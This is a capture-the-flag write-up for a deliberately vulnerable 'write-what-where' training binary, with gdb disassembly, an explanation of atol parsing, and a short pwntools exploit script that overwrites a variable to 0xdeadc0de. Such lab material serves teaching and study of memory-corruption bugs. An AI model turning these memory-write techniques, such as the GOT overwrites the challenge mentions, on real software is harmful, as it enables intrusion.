# 08_www_var Writeup

## Steps:
1. Run chall. In this challenge, the goal is to change the value of a variable at a specific address to 0xdeadc0de.
We are asked what we want to write and where to write it to, but are warned that the solution is not trivial.
```
$ ./chall 

Your goal is to modify the variable @ 0x7fffb6e517c8 to equal 0xdeadc0de

This is a write-what-where exercise, and should not be trivial. This primitive is usually
leveraged to overwrite entries on the GOT, or any writiable region of memory in the binary!

0x7fffb6e517a0: 0x0000000000000000 0x0000000000000000 
0x7fffb6e517b0: 0x0000000000000000 0x0000000000000000 
0x7fffb6e517c0: 0xffffffffffffffff 0x00000000deadbeef 

What would you like to write? AAAA
Where would you like to write it? AAAA
zsh: segmentation fault  ./chall
```
2. Since we are given `what` to write and `where`, we can use `recv` to collect the address of `where` and `0xdeadc0de` as `what`.
3. But, just printing these values still leads to a seg fault. This is where we remember that we are warned the solution is not trivial.
So `disas main` using gdb gef. Notice after `fgets` the program uses `atol`.

```
   0x0000000000401702 <+284>:   call   0x401100 <fgets@plt>
   0x0000000000401707 <+289>:   lea    rax,[rbp-0x30]
   0x000000000040170b <+293>:   mov    rdi,rax
   0x000000000040170e <+296>:   call   0x401110 <atol@plt>
   0x0000000000401713 <+301>:   mov    QWORD PTR [rip+0x299e],rax        # 0x4040b8 <val>
   0x000000000040171a <+308>:   lea    rdi,[rip+0xa87]        # 0x4021a8
   0x0000000000401721 <+315>:   mov    eax,0x0
```
Check the man pages if you don't know what atol does.
```
long atol(const char *nptr);

DESCRIPTION
       The  atoi()  function converts the initial portion of the string pointed to by nptr to int.  The behavior is
       the same as

           strtol(nptr, NULL, 10);

       except that atoi() does not detect errors.

       The atol() and atoll() functions behave the same as atoi(), except that they convert the initial portion  of
       the string to their return type of long or long long.

RETURN VALUE
       The converted value or 0 on error.
```
This means that the input we provide is converted from a string into a long integer. 
Thus, we cannot simply write the hex values; they must be strings that can be converted into decimal values equivalent to the hex values.

4. Write the payloads.
   1 -  `0xdeadc0de` converted to an `int` then `str`
   2 - address in hex converted to an `int` then `str`
```
from pwn import *

target = process('./chall')

val = int("0xdeadc0de", 16)
target.recvuntil(b"variable @ ")
addr  = target.recvuntil(b" ", False)
addr = int(addr, 16)


target.sendline(str(val))
target.sendline(str(addr))

s = target.recvall().decode()
print(s)
```

## Solution:
```
$ python3 exploit.py
[+] Starting local process './chall': pid 106852
/home/kali/Binex-Writeups/binex_tuts/08_www_var/exploit.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  target.sendline(str(val))
/home/kali/Binex-Writeups/binex_tuts/08_www_var/exploit.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  target.sendline(str(addr))
[+] Receiving all data: Done (774B)
[*] Process './chall' stopped with exit code 1 (pid 106852)
to equal 0xdeadc0de

This is a write-what-where exercise, and should not be trivial. This primitive is usually
leveraged to overwrite entries on the GOT, or any writiable region of memory in the binary!

0x7ffcb67a3570: 0x0000000000000000 0x0000000000000000 
0x7ffcb67a3580: 0x0000000000000000 0x0000000000000000 
0x7ffcb67a3590: 0xffffffffffffffff 0x00000000deadbeef 

What would you like to write? Where would you like to write it? 
0x7ffcb67a3570: 0x3633333237303431 0x0a38363538343939 
0x7ffcb67a3580: 0x0000000000000000 0x0000000000000000 
0x7ffcb67a3590: 0xffffffffffffffff 0x00000000deadc0de

Congrats! You modified the target variable!
```
